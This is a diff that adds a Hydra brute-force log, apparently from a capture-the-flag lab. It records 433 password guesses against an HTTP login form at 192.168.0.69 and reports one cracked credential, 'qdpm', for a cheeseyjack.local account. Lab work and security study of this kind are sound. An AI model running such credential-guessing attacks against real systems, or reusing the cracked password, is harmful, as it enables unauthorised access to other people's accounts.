@@ -1,0 +1,8 @@
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-07 10:56:07
+[DATA] max 64 task per 1 server, overall 64 task, 433 login tries (l:1/p:433), ~7 tries per task
+[DATA] attacking http-post-form://192.168.0.69:80/project_management/index.php/login:username=^USER^&password=^PASS^:Error: No match for Email and/or Password
+[80][http-post-form] host 192.168.0.69 login ch33s3m4n@cheeseyjack.local password:qdpm
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-07 11:21:01
